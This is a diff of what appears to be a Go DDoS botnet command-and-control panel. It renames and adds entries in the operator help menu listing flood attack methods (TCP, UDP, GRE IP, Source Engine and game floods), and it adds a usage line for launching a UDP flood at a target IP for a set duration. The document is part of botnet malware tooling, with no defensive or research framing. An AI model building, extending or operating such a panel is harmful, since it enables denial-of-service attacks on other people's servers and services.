@@ -166,11 +166,13 @@ conn.Write([]byte("\r\n\r\n\x1b[0m")) // reset color
             session.Conn.Write([]byte("\x1b[36mackflood:\x1b[31m tcp flooding with ack flags.\r\n"))
             session.Conn.Write([]byte("\x1b[36mppsflood:\x1b[31m udp flood for high pps.\r\n"))
             session.Conn.Write([]byte("\x1b[36msackflood:\x1b[31m custom ack flood.\r\n"))
-            session.Conn.Write([]byte("\x1b[36msocket:\x1b[31m tcp flood for high connections.\r\n"))
-            session.Conn.Write([]byte("\x1b[36mtcpbypass:\x1b[31m tcp custom flood for bypassing.\r\n"))
+            session.Conn.Write([]byte("\x1b[36mtcpsocket:\x1b[31m tcp flood for high connections.\r\n"))
+            session.Conn.Write([]byte("\x1b[36mtcpstream:\x1b[31m tcp custom flood for bypassing.\r\n"))
             session.Conn.Write([]byte("\x1b[36mstdhex:\x1b[31m udp flood with random hex.\r\n"))
             session.Conn.Write([]byte("\x1b[36mvseflood:\x1b[31m value source engine flood.\r\n"))
-            session.Conn.Write([]byte("\x1b[36mgame:\x1b[31m tcp based custom flood for games.\r\n\r\n"))
+            session.Conn.Write([]byte("\x1b[36mgreip:\x1b[31m gre ip flood.\r\n\r\n"))
+	    session.Conn.Write([]byte("\x1b[36mtcpwra:\x1b[31m tcp custom flood for games.\r\n\r\n"))
+	    session.Conn.Write([]byte("\x1b[37msyntax: .udpthread 1.1.1.1 60 dport=80\r\n"))
 		case "?", "help":
 			access := 2
 			session.Conn.Write([]byte(strings.Repeat(" ", access) + "\x1b[34mmethods\x1b[37m - shows all methods\x1b[0m\r\n"))
